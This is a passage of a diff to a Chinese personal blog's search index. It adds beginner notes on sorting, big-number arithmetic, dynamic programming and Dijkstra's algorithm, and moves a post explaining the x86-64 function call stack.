+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|0|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
-<h4 id="bin是什么">bin是什么</h4>
-<p>首先，用户释放的chunk不会马上归还给系统，ptmalloc会统一管理heap和mmap映射区域中空闲的chunk，用户再次请求分配内存时，ptmalloc会试图在空闲的chunk中挑选一块合适的给用户，可避免频繁地系统调用。ptmalloc会将空闲chunk的大小以及使用状态将chunk分为4类，fast bins, small bins, large bins, unsorted bin。相似大小的chunk会用双向链表链接起来，也就是说每类bin的内部会有多个互不相关的链表来保存不同大小的chunk。</p>
+<h4 id="函数开始">函数开始</h4>
+<p>如图：</p>
+<p><img src="https://i.niupic.com/images/2022/10/14/a8dM.jpg" alt=""></p>
+<p>当我们开始调用函数时，从最底部开始，第一步是将函数调用的参数传入，顺序是从右至左，在将所有参数push进入栈时。进行指令call func。这里func就是即将调用的函数。每一个call func都可以默认包含两个步骤：push retaddr 和jmp func。传参完毕后会将返回地址Push进入栈中，即图中saved rip的位置，这个retaddr的地址就是call指令下一条指令的地址，目的是为了知道返回而执行下一条指令。进入函数之后该函数会开启一个新的栈帧，默认有三步，第一步push rbp,会将上一个函数的rbp压入栈中，意为保存栈，方便恢复。第二步mov rbp,rsp，会将rsp的值赋给rbp，即将rbp抬高。第三步sub rsp,xxh，为了将rsp减去一定量的字节数，这样就形成了有rsp和rbp包裹的栈结构。</p>
+<h4 id="函数结束">函数结束</h4>
+<p><img src="https://i.niupic.com/images/2022/10/14/a8dM.jpg" alt=""></p>
+<p>首先leave指令可以分解为两个更加基本的指令，第一个是mov rsp,rbp。这一步是为了将rsp变到和rbp同一个位置，第二个指令是pop rbp，弹出rbp。这样就会把储存的上一个函数的rbp弹出，rbp就指向下一个函数了。最后ret指令可以看作pop rip。这个指令会把调用函数时Push的retaddr给弹出，执行流指向下一个指令的地址（即这个retaddr）。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>基础算法01</title>
+    <url>/2022/07/01/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%9501/</url>
+    <content><![CDATA[<p>这里存放一点非常基础的算法，忘记了可以来看一眼。</p>
+<p>主要是：排序总结，高精度总结。</p>
+<span id="more"></span>
+<h3 id="排序模板">排序模板</h3>
+<h4 id="冒泡排序">冒泡排序</h4>
+<p>这应该是最经典的排序方法，实现也很简单，也很好理解，但是时间会慢一点，复杂度是O($n^2$)</p>
+<p>原理大概意思是比较相邻的两个数，如果他们的关系是正确的，则不做操作，如不是，则交换两个数的位置，这样从头到尾进行一次之后最大的数应该是在最后的位置，这个数就是正确顺序的，就像一个泡泡一样冒到了边缘(?    再次重复这个操作，一次完成n-1，n-2，…的排序，至此排序完成。</p>
+<p>核心代码如下:</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++)<span class="comment">//外层循环记录要大排序次数，是数组元素数量-1</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n - i - <span class="number">1</span>; j++)<span class="comment">//内层循环记录在一次排序下两两比较的次数，是大排序总次数减去当前排序的次数</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) <span class="built_in">swap</span>(arr[j], arr[j + <span class="number">1</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>实现较为简单，因为有两层循环的缘故，时间可能较慢，另外需要注意两次循环的边界条件</p>
+<h4 id="快速排序">快速排序</h4>
+<p>快排是c++内置sort函数的排序方法，时间会比较快，最好的情况是O($n\log_2 n$),最坏的情况是O($n^2$),平均复杂度在O($n \log_2 n$),因此用的比较多。</p>
+<p>原理也比较好理解:先把整个数列分成两部分，把两边的数据和中间值比较，比中间值小的放左边，反之放右边，依次操作完毕后这个中间值就是已排序状态，然后分别用同样的方法操作左右两段数据，可以看出这是根据递归定义的排序方法，在递归最底层达到条件：找不到中间值时，整段数据已经排序完毕。这里解释的不是特别全面，有一些情况可以根据代码举个例子理解。</p>
+<p>核心代码大同小异，这里我就摆一种：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">quicksort</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span><span class="comment">//l,r表示数组的左右两端</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> mid=arr[(l+r)/<span class="number">2</span>];</span><br><span class="line">	<span class="type">int</span> i=l,j=r;</span><br><span class="line">	<span class="keyword">while</span>(i&lt;=j)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">while</span>(arr[i]&lt;mid) i++;</span><br><span class="line">		<span class="keyword">while</span>(arr[j]&gt;mid) j--;</span><br><span class="line">		<span class="keyword">if</span>(i&lt;=j)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">swap</span>(arr[i],arr[j]);</span><br><span class="line">			i++;</span><br><span class="line">			j--;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(l&lt;j) <span class="built_in">quicksort</span>(l,j);</span><br><span class="line">	<span class="keyword">if</span>(r&gt;i) <span class="built_in">quicksort</span>(i,r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>排序就先摆两个吧，有空了再贴(画饼</p>
+<h3 id="高精度计算">高精度计算</h3>
+<h4 id="a-b高精度">a+b高精度</h4>
+<p>高精度计算在c++中会出现是因为即使是unsigned long long型的数据最大值也就在二十位数据，也就是18446744073709551615，这样一个数据如果超过了，c++就显示不了了，会发生溢出的现象，但是在实际计算中计算大数据也不少见，因此需要用到高精度的技巧。</p>
+<p>高精度一个很基础的想法就是数无法使用，那就使用数组，基本思路是使用字符串型读入数据，再转入数组之中进行操作。下一步可以理解为模拟竖式加法的做法，依次从个位开始对两个数字进行相加，大于10则保留个位并将十位上进一，依次操作到最后一位，并将结果数组倒序输出即可。</p>
+<p><strong>实现代码：</strong></p>
+<p>读入数组部分：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">change_arr</span><span class="params">(string a ,string b)</span><span class="comment">//转换函数，熟练之后可以和相加函数结合 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;a.<span class="built_in">size</span>();i++)<span class="comment">//转换注意需要倒序读入数组，因为相加需要进位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		arr_a[a.<span class="built_in">size</span>()-i<span class="number">-1</span>]=a[i]<span class="number">-48</span>;<span class="comment">//一次只能读入一个数组，因为两个大数字位数不一定相等</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_b[b.<span class="built_in">size</span>()-i<span class="number">-1</span>]=b[i]<span class="number">-48</span>;<span class="comment">//这里减去48可以换成&#x27;0&#x27; </span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>计算部分：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">tooplus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> temp=<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>());</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;temp;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		s[i]+=arr_a[i]+arr_b[i];<span class="comment">//这里必须使用+=因为要注意前一位的进位，防止丢失数据</span></span><br><span class="line">		s[i+<span class="number">1</span>]=s[i]/<span class="number">10</span>;</span><br><span class="line">		s[i]%=<span class="number">10</span>;<span class="comment">//标准操作，进位且本位取最后一位数字 </span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(s[temp]&gt;<span class="number">0</span>) add=<span class="number">1</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>全部代码：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string a,b;<span class="comment">//在long long 存储不了的情况下，基本思路是通过字符串读入，转到数组进行操作 </span></span><br><span class="line"><span class="type">int</span> arr_a[<span class="number">100005</span>],arr_b[<span class="number">100005</span>],s[<span class="number">100005</span>],add=<span class="number">0</span>;<span class="comment">//s数组用于储存加完之后的数字 ,add用于处理进位的数字 </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">change_arr</span><span class="params">(string a ,string b)</span><span class="comment">//转换函数，熟练之后可以和相加函数结合 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;a.<span class="built_in">size</span>();i++)<span class="comment">//转换注意需要倒序读入数组，因为相加需要进位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		arr_a[a.<span class="built_in">size</span>()-i<span class="number">-1</span>]=a[i]<span class="number">-48</span>;<span class="comment">//一次只能读入一个数组，因为两个大数字位数不一定相等</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_b[b.<span class="built_in">size</span>()-i<span class="number">-1</span>]=b[i]<span class="number">-48</span>;<span class="comment">//这里减去48可以换成&#x27;0&#x27; </span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tooplus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> temp=<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>());</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;temp;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		s[i]+=arr_a[i]+arr_b[i];<span class="comment">//这里必须使用+=因为要注意前一位的进位，防止丢失数据</span></span><br><span class="line">		s[i+<span class="number">1</span>]=s[i]/<span class="number">10</span>;</span><br><span class="line">		s[i]%=<span class="number">10</span>;<span class="comment">//标准操作，进位且本位取最后一位数字 </span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(s[temp]&gt;<span class="number">0</span>) add=<span class="number">1</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;a&gt;&gt;b;<span class="comment">//读入数据，为string型</span></span><br><span class="line">	<span class="built_in">change_arr</span>(a,b);</span><br><span class="line">	<span class="built_in">tooplus</span>();</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>())+add<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)<span class="comment">//判断输出的时候是否需要输出最终多出的一位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		cout&lt;&lt;s[i]; </span><br><span class="line">	&#125;</span><br><span class="line">	 <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里有一道例题，洛谷的p1601,可以用这个解法。</p>
+<h4 id="a-b高精度，a-b高精度">a-b高精度，a*b高精度</h4>
+<p>这两种方法基本一样，要注意的是减法有一些特殊情况，比如负数，输出长度的判断等等，这里我就摆一种简单的，乘法也是需要注意长度区别。</p>
+<p>实现代码：</p>
+<p>减法：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string a,b;</span><br><span class="line"><span class="type">bool</span> jg;</span><br><span class="line"><span class="type">int</span> arr_a[<span class="number">100005</span>],arr_b[<span class="number">10005</span>],ans[<span class="number">100005</span>],temp;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">re_input</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=a.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_a[i]=a[a.<span class="built_in">size</span>()-i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">1</span>;j&lt;=b.<span class="built_in">size</span>();j++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_b[j]=b[b.<span class="built_in">size</span>()-j]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">to_divide</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=temp;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(arr_a[i]&lt;arr_b[i])</span><br><span class="line">		&#123;</span><br><span class="line">			arr_a[i+<span class="number">1</span>]--;</span><br><span class="line">			arr_a[i]+=<span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		ans[i]=arr_a[i]-arr_b[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(ans[temp]==<span class="number">0</span>) temp--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">to_printf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(jg==<span class="literal">true</span>) cout&lt;&lt;<span class="string">&quot;-&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =temp;i&gt;<span class="number">0</span>;i--)</span><br><span class="line">	&#123;</span><br><span class="line">		cout&lt;&lt;ans[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(temp&lt;<span class="number">1</span>) cout&lt;&lt;<span class="string">&quot;0&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">	<span class="keyword">if</span>(a&lt;b&amp;&amp;a.<span class="built_in">size</span>()==b.<span class="built_in">size</span>()||a.<span class="built_in">size</span>()&lt;b.<span class="built_in">size</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">swap</span>(a,b);</span><br><span class="line">		jg=<span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	temp=<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>());</span><br><span class="line">	<span class="built_in">re_input</span>();</span><br><span class="line">	<span class="built_in">to_divide</span>();</span><br><span class="line">	<span class="built_in">to_printf</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>乘法：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string a,b;</span><br><span class="line"><span class="type">int</span> arr01[<span class="number">100005</span>],arr02[<span class="number">100005</span>],sum[<span class="number">100005</span>],temp=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">re_change</span><span class="params">()</span><span class="comment">//倒序存储部分 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;a.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr01[i]=a[a.<span class="built_in">size</span>()-i<span class="number">-1</span>]<span class="number">-48</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr02[i]=b[b.<span class="built_in">size</span>()-i<span class="number">-1</span>]<span class="number">-48</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mutiply</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">0</span>;j&lt;a.<span class="built_in">size</span>();j++)</span><br><span class="line">		&#123;</span><br><span class="line">			sum[i+j]+=arr01[j]*arr02[i];<span class="comment">//注意下标从1开始，进位减去1 </span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(temp =<span class="number">0</span>;temp&lt;=a.<span class="built_in">size</span>()+b.<span class="built_in">size</span>();temp++)<span class="comment">//处理进位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		</span><br><span class="line">		sum[temp]+=sum[temp<span class="number">-1</span>]/<span class="number">10</span>;</span><br><span class="line">		sum[temp<span class="number">-1</span>]%=<span class="number">10</span>;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//temp=a.size()+b.size();</span></span><br><span class="line">	<span class="keyword">while</span>(sum[temp]==<span class="number">0</span>&amp;&amp;temp&gt;=<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		temp--;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"> &#125; </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">	<span class="built_in">re_change</span>();</span><br><span class="line">	<span class="built_in">mutiply</span>();</span><br><span class="line">	<span class="keyword">for</span>(;temp&gt;=<span class="number">0</span>;temp--)</span><br><span class="line">	&#123;</span><br><span class="line">		cout&lt;&lt;sum[temp];</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>以上内容皆为初学者的浅薄理解，如有错误麻烦立即告诉作者，别喷别喷别喷呜呜呜~</p>
 ]]></content>
       <categories>
-        <category>CTF!</category>
+        <category>算法</category>
       </categories>
       <tags>
-        <tag>基础</tag>
-        <tag>pwn</tag>
+        <tag>算法</tag>
+        <tag>C++</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>基础算法02</title>
+    <url>/2022/07/01/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%9502/</url>
+    <content><![CDATA[<p>dp(动态规划)的基本例题，可以浅浅的帮助理解。</p>
+<span id="more"></span>
+<h4 id="例题一">例题一</h4>
+<p>先来看一道很简单的例题：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51T.png" alt=""></p>
+<p>具体要求如下：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51U.png" alt=""></p>
+<p>根据格式可以推出状态方程，这个方程不难，主要关注dp思想，找到状态方程，此题不难发现每一个数字只能往下或者往右走，因此每一个位置的最大值就等于其上面或上左位置的最大值，找到每一个数的最大值，这基本就是动态规划的思想。</p>
+<p>核心代码如下：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>ac代码如下：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> ans;</span><br><span class="line"><span class="type">int</span> dp[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> number[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			cin&gt;&gt;number[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">dpcount</span>();</span><br><span class="line">	cout&lt;&lt;ans;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>算法</category>
+      </categories>
+      <tags>
+        <tag>算法</tag>
+        <tag>C++</tag>
       </tags>
   </entry>
   <entry>
@@ -540,94 +626,108 @@
         <category>算法</category>
       </categories>
       <tags>
-        <tag>C++</tag>
         <tag>算法</tag>
+        <tag>C++</tag>
       </tags>
   </entry>
   <entry>
-    <title>函数调用栈</title>
-    <url>/2022/10/14/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88/</url>
-    <content><![CDATA[<p>c语言调用函数时栈的情况</p>
-<span id="more"></span>
-<h4 id="函数开始">函数开始</h4>
-<p>如图：</p>
-<p><img src="https://i.niupic.com/images/2022/10/14/a8dM.jpg" alt=""></p>
-<p>当我们开始调用函数时，从最底部开始，第一步是将函数调用的参数传入，顺序是从右至左，在将所有参数push进入栈时。进行指令call func。这里func就是即将调用的函数。每一个call func都可以默认包含两个步骤：push retaddr 和jmp func。传参完毕后会将返回地址Push进入栈中，即图中saved rip的位置，这个retaddr的地址就是call指令下一条指令的地址，目的是为了知道返回而执行下一条指令。进入函数之后该函数会开启一个新的栈帧，默认有三步，第一步push rbp,会将上一个函数的rbp压入栈中，意为保存栈，方便恢复。第二步mov rbp,rsp，会将rsp的值赋给rbp，即将rbp抬高。第三步sub rsp,xxh，为了将rsp减去一定量的字节数，这样就形成了有rsp和rbp包裹的栈结构。</p>
-<h4 id="函数结束">函数结束</h4>
-<p><img src="https://i.niupic.com/images/2022/10/14/a8dM.jpg" alt=""></p>
-<p>首先leave指令可以分解为两个更加基本的指令，第一个是mov rsp,rbp。这一步是为了将rsp变到和rbp同一个位置，第二个指令是pop rbp，弹出rbp。这样就会把储存的上一个函数的rbp弹出，rbp就指向下一个函数了。最后ret指令可以看作pop rip。这个指令会把调用函数时Push的retaddr给弹出，执行流指向下一个指令的地址（即这个retaddr）。</p>
+    <title>基础算法03</title>
+    <url>/2022/11/27/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%9503/</url>
+    <content><![CDATA[<p>不过是笔记本罢了(悲~</p>
+<h2 id="Dijkstra-算法（狄克斯特拉算法）">Dijkstra 算法（狄克斯特拉算法）</h2>
+<p>这是一种求解无负权边图的最短路径的算法，他的大概过程是先将<strong>已确定最短路径</strong>的点和<strong>未确定最短路径</strong>的点分别分为两个集合，一开始所有点都处于后者集合，随后依次从后者集合取出最短路长度最小的点，移到前者集合中。这里要注意这个算法只适用于有向无环图。</p>
+<p>该算法是求源点到其他各个顶点的最短路径，如果求解任意两个顶点的最短路径，则需要以每个顶点为源点，重复调用n次Dijkstra算法。</p>
+<h3 id="算法步骤：">算法步骤：</h3>
+<ol>
+<li>初始化，令集合S={u}，对于集合V-S中的所有顶点i，$dist[i]=G.Edge[u][i]$。</li>
+<li>找最小，在集合V-S中依照贪心策略寻找使得dist[j]具有最小值的顶点t，即$dist[t]=min(dist[j])$，即顶点t就是集合V-S中距离原点u最近的顶点。</li>
+<li>将顶点t加入集合S中，更新V-S</li>
+<li>如果结合V-S为空则算法结束，否则跳转第五步</li>
+<li>在第2步中已经找到了源点到t的最短路径，那么对集合V−S中所有与顶点t相邻的顶点j，都可以借助t走捷径。如果$dist[j]&gt;dist[t]+G.Edge[t][j]$，则$dist[j]=dist[t]+G.Edge[t][j]$，记录顶点j的前驱为t，有p[j]=t，转到第2步。</li>
+</ol>
+<h3 id="代码实现">代码实现</h3>
+<p>首先该算法需要一个图结构，包含顶点集合，边集合，顶点数，边数，</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">	VexType Vex[MaxVnum];</span><br><span class="line">	EdgeType Edge[MaxVnum][MaxVnum];</span><br><span class="line">	<span class="type">int</span> vexnum,edgenum; <span class="comment">//顶点数，边数</span></span><br><span class="line">&#125;AMGragh;</span><br></pre></td></tr></table></figure>
+<p>需要一个查找下标的函数</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">locatevex</span><span class="params">(AMGragh G,VexType x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;G.vexnum;i++)<span class="comment">//查找顶点信息的下标</span></span><br><span class="line">		<span class="keyword">if</span>(x==G.Vex[i])</span><br><span class="line">			<span class="keyword">return</span> i;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;<span class="comment">//没找到</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
